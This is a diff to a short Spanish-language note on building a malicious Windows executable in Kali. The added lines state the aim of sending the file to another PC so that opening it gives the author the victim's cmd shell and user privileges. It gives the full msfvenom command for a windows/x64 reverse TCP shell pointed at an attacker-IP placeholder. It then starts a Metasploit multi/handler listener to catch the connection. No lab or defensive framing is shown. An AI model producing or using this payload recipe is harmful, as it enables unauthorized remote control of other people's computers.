@@ -1,8 +1,10 @@
-***********para crear el archivo del script **********
-sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip de la maquina atacante} LPORT=4444 -f exe > [nombre del archivo].exe
-
+para crear un script para en la terminal de kali y enviarlo a otra pc que cuando lo habra se establecera la coneccion y podre acceder al cmd
+y tener sus privilegios de usuario 
 
 ejecutar en la terminal de  Kali, prepara el receptor profesional:
+
+***********para crear el archivo del script **********
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip de la maquina atacante} LPORT=4444 -f exe > [nombre del archivo].exe
 
 msfconsole -q
 use exploit/multi/handler
